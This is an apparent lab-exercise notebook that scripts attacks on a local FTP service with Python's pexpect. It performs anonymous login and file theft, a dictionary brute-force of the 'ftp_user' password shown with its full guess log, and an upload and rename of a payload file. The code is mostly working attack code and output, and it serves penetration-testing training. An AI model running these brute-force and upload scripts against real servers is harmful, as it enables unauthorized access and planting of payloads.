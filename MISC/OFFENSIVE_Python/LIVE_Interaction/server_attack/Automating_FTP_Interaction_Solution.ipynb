{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Automating FTP Interaction Solution"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "FTP service is running on it's **default port** on the local machine. Write code snippets to perform the given tasks.\n",
    "\n",
    "Note: A password dictionary \"password_dictionary.txt\" is present in the current working directory. \n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Anonymous User"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Task 1:**  Print the FTP welcome banner."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Connected to localhost.\r\n",
      "220 Welcome to AttackDefense target FTP service.\r\n",
      "\n"
     ]
    }
   ],
   "source": [
    "import pexpect\n",
    "\n",
    "# Launching the process\n",
    "child = pexpect.spawn ('ftp localhost')\n",
    "# Expecting a username prompt\n",
    "child.expect ('Name .*: ')\n",
    "\n",
    "# Printing the interaction\n",
    "print child.before"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Task 2:**  Check if you can login to FTP service without any authentication i.e. anonymous user?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\r\n",
      "230 Login successful.\r\n",
      "Remote system type is UNIX.\r\n",
      "Using binary mode to transfer files.\r\n",
      "\n"
     ]
    }
   ],
   "source": [
    "import pexpect\n",
    "\n",
    "child = pexpect.spawn ('ftp localhost')\n",
    "child.expect ('Name .*: ')\n",
    "\n",
    "# Anonymous login\n",
    "child.sendline ('anonymous')\n",
    "# Expected Password prompt\n",
    "child.expect ('Password:')\n",
    "# Password\n",
    "child.sendline ('noah@example.com')\n",
    "# Expecting FTP prompt\n",
    "child.expect ('ftp> ')\n",
    "\n",
    "\n",
    "print child.before"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Task 3:**  Print the contents of remote working directory."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ls\r\n",
      "200 PORT command successful. Consider using PASV.\r\n",
      "150 Here comes the directory listing.\r\n",
      "drwxr-xr-x    1 65534    65534        4096 Sep 24 02:58 ftp\r\n",
      "226 Directory send OK.\r\n",
      "\n"
     ]
    }
   ],
   "source": [
    "import pexpect\n",
    "\n",
    "child = pexpect.spawn ('ftp localhost')\n",
    "child.expect ('Name .*: ')\n",
    "child.sendline ('anonymous')\n",
    "child.expect ('Password:')\n",
    "child.sendline ('noah@example.com')\n",
    "child.expect ('ftp> ')\n",
    "# Sending directory listing command\n",
    "child.sendline ('ls')\n",
    "# Expecting FTP prompt\n",
    "child.expect ('ftp> ')\n",
    "\n",
    "print child.before"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Task 4:**  Read the content of the file \"secret.txt\" present in \"ftp\" directory of remote machine."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "get secret.txt -\r\n",
      "remote: secret.txt\r\n",
      "200 PORT command successful. Consider using PASV.\r\n",
      "150 Opening BINARY mode data connection for secret.txt (41 bytes).\r\n",
      "secret nonce: thisisasecretnonce98835648\r\n",
      "226 Transfer complete.\r\n",
      "41 bytes received in 0.00 secs (315.2682 kB/s)\r\n",
      "\n"
     ]
    }
   ],
   "source": [
    "import pexpect\n",
    "\n",
    "child = pexpect.spawn ('ftp localhost')\n",
    "child.expect ('Name .*: ')\n",
    "child.sendline ('anonymous')\n",
    "child.expect ('Password:')\n",
    "child.sendline ('noah@example.com')\n",
    "child.expect ('ftp> ')\n",
    "child.sendline ('ls')\n",
    "child.expect ('ftp> ')\n",
    "\n",
    "# Change to directory\n",
    "child.sendline ('cd ftp')\n",
    "child.expect ('ftp> ')\n",
    "# Listing files in subdirectory\n",
    "child.sendline ('ls')\n",
    "child.expect ('ftp> ')\n",
    "# Printing contents of the  secret.txt file\n",
    "child.sendline ('get secret.txt -')\n",
    "child.expect ('ftp> ')\n",
    "\n",
    "print child.before"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Task 5:**  Get the file \"secret.txt\" present in \"ftp\" to local machine."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "get secret.txt\r\n",
      "local: secret.txt remote: secret.txt\r\n",
      "200 PORT command successful. Consider using PASV.\r\n",
      "150 Opening BINARY mode data connection for secret.txt (41 bytes).\r\n",
      "226 Transfer complete.\r\n",
      "41 bytes received in 0.00 secs (261.6932 kB/s)\r\n",
      "\n"
     ]
    }
   ],
   "source": [
    "import pexpect\n",
    "\n",
    "child = pexpect.spawn ('ftp localhost')\n",
    "child.expect ('Name .*: ')\n",
    "child.sendline ('anonymous')\n",
    "child.expect ('Password:')\n",
    "child.sendline ('noah@example.com')\n",
    "child.expect ('ftp> ')\n",
    "child.sendline ('ls')\n",
    "child.expect ('ftp> ')\n",
    "child.sendline ('cd ftp')\n",
    "child.expect ('ftp> ')\n",
    "child.sendline ('ls')\n",
    "child.expect ('ftp> ')\n",
    "\n",
    "# Downloading the secret.txt file\n",
    "child.sendline ('get secret.txt')\n",
    "child.expect ('ftp> ')\n",
    "\n",
    "print child.before"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Authenticated User"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Task 6:**  Figure out the password for user \"ftp_user\" by bruteforcing the FTP login. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying with password:  123456\n",
      "Trying with password:  12345\n",
      "Trying with password:  1234\n",
      "Trying with password:  1234567\n",
      "Trying with password:  dragon\n",
      "Trying with password:  baseball\n",
      "Trying with password:  abc123\n",
      "Trying with password:  letmein\n",
      "Trying with password:  696969\n",
      "Trying with password:  shadow\n",
      "Trying with password:  michael\n",
      "Trying with password:  654321\n",
      "Trying with password:  superman\n",
      "Trying with password:  1qaz2wsx\n",
      "Trying with password:  7777777\n",
      "Trying with password:  121212\n",
      "Trying with password:  000000\n",
      "Trying with password:  qazwsx\n",
      "Trying with password:  123qwe\n",
      "Trying with password:  killer\n",
      "Trying with password:  trustno1\n",
      "Trying with password:  jordan\n",
      "Trying with password:  jennifer\n",
      "Trying with password:  zxcvbnm\n",
      "Trying with password:  asdfgh\n",
      "Trying with password:  hunter\n",
      "Trying with password:  buster\n",
      "Trying with password:  soccer\n",
      "Trying with password:  harley\n",
      "Trying with password:  batman\n",
      "Trying with password:  andrew\n",
      "Trying with password:  tigger\n",
      "Trying with password:  sunshine\n",
      "Trying with password:  iloveyou\n",
      "Trying with password:  2000\n",
      "Trying with password:  charlie\n",
      "Trying with password:  robert\n",
      "Trying with password:  thomas\n",
      "Trying with password:  hockey\n",
      "Trying with password:  ranger\n",
      "Trying with password:  daniel\n",
      "Trying with password:  starwars\n",
      "Trying with password:  klaster\n",
      "Trying with password:  112233\n",
      "Trying with password:  george\n",
      "Trying with password:  computer\n",
      "Trying with password:  maggie\n",
      "Trying with password:  159753\n",
      "Trying with password:  aaaaaa\n",
      "Trying with password:  ginger\n",
      "Trying with password:  princess\n",
      "Trying with password:  joshua\n",
      "Trying with password:  cheese\n",
      "Trying with password:  amanda\n",
      "Trying with password:  summer\n",
      "Trying with password:  love\n",
      "Trying with password:  ashley\n",
      "Trying with password:  6969\n",
      "Trying with password:  nicole\n",
      "Trying with password:  chelsea\n",
      "Trying with password:  matthew\n",
      "Trying with password:  access\n",
      "Trying with password:  diamond\n",
      "Trying with password:  1234qwer\n",
      "Trying with password:  gfhjkm\n",
      "Trying with password:  silver\n",
      "Trying with password:  222222\n",
      "Trying with password:  88888888\n",
      "Trying with password:  anthony\n",
      "Trying with password:  justin\n",
      "Trying with password:  bailey\n",
      "Trying with password:  q1w2e3r4t5\n",
      "Trying with password:  internet\n",
      "Trying with password:  scooter\n",
      "Trying with password:  golfer\n",
      "Trying with password:  cookie\n",
      "Trying with password:  phoenix\n",
      "Trying with password:  camaro\n",
      "Trying with password:  sexy\n",
      "Trying with password:  welcome@234\n",
      "Trying with password:  peanut\n",
      "Trying with password:  morgan\n",
      "Trying with password:  andrea\n",
      "Trying with password:  smokey\n",
      "Trying with password:  steelers\n",
      "Trying with password:  joseph\n",
      "Trying with password:  mercedes\n",
      "Trying with password:  dakota\n",
      "Trying with password:  arsenal\n",
      "Trying with password:  qwer1234\n",
      "Login Successful for  qwer1234\n",
      "\n",
      "230 \n"
     ]
    }
   ],
   "source": [
    "import pexpect\n",
    "\n",
    "username='ftp_user'\n",
    "password_dict=\"password_dictionary.txt\"\n",
    "\n",
    "# Loading the password dictionary and Striping \\n\n",
    "lines = [line.rstrip('\\n') for line in open(password_dict)]\n",
    "\n",
    "itr = 0\n",
    "# Iterating over dictionary\n",
    "for password in lines:\n",
    "    child = pexpect.spawn ('ftp localhost')\n",
    "    child.expect ('Name .*: ')\n",
    "    child.sendline ('ftp_user')\n",
    "    print \"Trying with password: \",password\n",
    "    child.expect ('Password:')\n",
    "    child.sendline (password)\n",
    "    i = child.expect (['Login successful', 'Login failed'])\n",
    "    if i==1:\n",
    "        #print('Login failed')\n",
    "        child.kill(0)\n",
    "    elif i==0:\n",
    "        print \"Login Successful for \",password\n",
    "        print child.before\n",
    "        break"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Task 7:** Copy \"payload.bin\" file from present working directory to \"ftp/files\" directory of the remote machine."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ls\r\n",
      "200 PORT command successful. Consider using PASV.\r\n",
      "150 Here comes the directory listing.\r\n",
      "drwxrwxrwx    1 999      999          4096 Sep 24 03:50 files\r\n",
      "-rw-r--r--    1 0        0              41 Sep 20 18:07 secret.txt\r\n",
      "226 Directory send OK.\r\n",
      "\n",
      "ls\r\n",
      "200 PORT command successful. Consider using PASV.\r\n",
      "150 Here comes the directory listing.\r\n",
      "-rw-------    1 1001     1001           49 Sep 24 03:51 payload.bin\r\n",
      "-rw-------    1 1001     1001           49 Sep 24 03:49 payload.sh\r\n",
      "226 Directory send OK.\r\n",
      "\n"
     ]
    }
   ],
   "source": [
    "import pexpect \n",
    "\n",
    "username='ftp_user'\n",
    "password='qwer1234'\n",
    "\n",
    "child = pexpect.spawn ('ftp localhost')\n",
    "child.expect ('Name .*: ')\n",
    "child.sendline (username)\n",
    "child.expect ('Password:')\n",
    "child.sendline (password)\n",
    "child.expect ('ftp> ')\n",
    "child.sendline ('ls')\n",
    "child.expect ('ftp> ')\n",
    "print child.before\n",
    "\n",
    "child.sendline ('cd files')\n",
    "child.expect ('ftp> ')\n",
    "\n",
    "# Uploading the secret.txt file\n",
    "child.sendline ('put payload.bin')\n",
    "child.expect ('ftp> ')\n",
    "\n",
    "child.sendline ('ls')\n",
    "child.expect ('ftp> ')\n",
    "print child.before\n",
    "\n",
    "child.kill(0)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Task 8:**  Rename the payload.bin file (eralier transfered to \"ftp/files\" directory) to \"payload.sh\". "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ls\r\n",
      "200 PORT command successful. Consider using PASV.\r\n",
      "150 Here comes the directory listing.\r\n",
      "drwxrwxrwx    1 999      999          4096 Sep 24 03:51 files\r\n",
      "-rw-r--r--    1 0        0              41 Sep 20 18:07 secret.txt\r\n",
      "226 Directory send OK.\r\n",
      "\n",
      "cd files\r\n",
      "250 Directory successfully changed.\r\n",
      "\n",
      "ls\r\n",
      "200 PORT command successful. Consider using PASV.\r\n",
      "150 Here comes the directory listing.\r\n",
      "-rw-------    1 1001     1001           49 Sep 24 03:51 payload.sh\r\n",
      "226 Directory send OK.\r\n",
      "\n"
     ]
    }
   ],
   "source": [
    "import pexpect \n",
    "\n",
    "username='ftp_user'\n",
    "password='qwer1234'\n",
    "\n",
    "child = pexpect.spawn ('ftp localhost')\n",
    "child.expect ('Name .*: ')\n",
    "child.sendline (username)\n",
    "child.expect ('Password:')\n",
    "child.sendline (password)\n",
    "child.expect ('ftp> ')\n",
    "child.sendline ('ls')\n",
    "child.expect ('ftp> ')\n",
    "print child.before\n",
    "\n",
    "child.sendline ('cd files')\n",
    "child.expect ('ftp> ')\n",
    "print child.before\n",
    "\n",
    "# Renaming the secret.txt file\n",
    "child.sendline ('rename payload.bin payload.sh')\n",
    "child.expect ('ftp> ')\n",
    "\n",
    "child.sendline ('ls')\n",
    "child.expect ('ftp> ')\n",
    "print child.before\n",
    "child.kill(0)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 2",
   "language": "python",
   "name": "python2"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.15rc1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
